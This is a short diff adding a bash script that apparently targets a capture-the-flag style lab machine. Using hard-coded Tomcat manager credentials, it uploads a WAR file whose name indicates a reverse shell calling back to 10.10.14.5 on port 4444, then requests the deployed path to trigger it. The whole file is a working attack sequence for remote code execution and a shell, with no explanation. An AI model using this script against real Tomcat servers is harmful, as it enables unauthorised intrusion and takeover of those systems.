@@ -1,0 +1,4 @@
+#!/bin/bash
+
+curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/mynameis --upload-file rev.10.10.14.5-4444.war
+curl http://10.10.10.194:8080/mynameis
